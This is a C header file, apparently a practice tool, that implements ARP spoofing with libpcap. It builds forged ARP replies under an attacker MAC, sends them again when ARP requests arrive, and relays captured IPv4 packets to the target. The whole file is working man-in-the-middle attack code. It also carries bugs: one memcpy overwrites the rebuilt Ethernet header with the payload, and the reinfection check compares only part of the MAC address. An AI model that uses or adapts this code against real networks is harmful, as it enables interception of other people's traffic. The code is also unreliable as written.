#pragma once
#include "init.h"

void arp_spoof(session ses);

void arp_spoof(session ses)
{
    ETHER_HEADER eth_hdr;
    arp_ether_ipv4 arp_hdr;
    IPv4_HEADER ipv4_hdr;

    /* arp reply packet make*/
    u_char* reply_buf = arp_reply_maker(ses.attackerMAC, ses.targetIP, ses.senderMAC, ses.senderIP);

    /* packet relay */
    while(true){
        struct pcap_pkthdr* header;
        const u_char* packet;

        int res = pcap_next_ex(ses.handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        memcpy(&eth_hdr, packet, sizeof(eth_hdr));
        // arp reinfection
        if(ntohs(eth_hdr.ether_type) == ether_type_ARP
                && eth_hdr.dst_addr[3] == ses.attackerMAC[3]
                && eth_hdr.dst_addr[4] == ses.attackerMAC[4]
                && eth_hdr.dst_addr[5] == ses.attackerMAC[5])
        {
            printf("ARP requset receive!\n");
            memcpy(&arp_hdr, packet+sizeof(eth_hdr), sizeof(arp_hdr));
            if(ntohs(arp_hdr.op_code) == ARP_Request)
            {
                for(int i=0; i<3; i++)
                {
                    int res = pcap_sendpacket(ses.handle, reply_buf, 42);
                    if(res == -1) printf("ARP Reply Packet Send Error!\n");
                }
            }
        }


        /* packet relay */
        u_char* relay_buf = (u_char*) malloc(header->caplen);
        if(ntohs(eth_hdr.ether_type) == ether_type_IPv4)
        {
            printf("\n%u bytes captured\n", header->caplen);

            memcpy(eth_hdr.dst_addr, ses.targetMAC, sizeof(u_char)*6);
            memcpy(eth_hdr.src_addr, ses.attackerMAC, sizeof(u_char)*6);
            memcpy(relay_buf, &eth_hdr, sizeof(eth_hdr));
            memcpy(relay_buf, packet+sizeof(eth_hdr), header->caplen - sizeof(eth_hdr));

            int res = pcap_sendpacket(ses.handle, relay_buf, header->caplen);
            if(res == -1) printf("ARP Relay Packet Send Error!\n");

            printf("Relay packet send!\n");
        }

        free(relay_buf);
    }
    free(reply_buf);
}
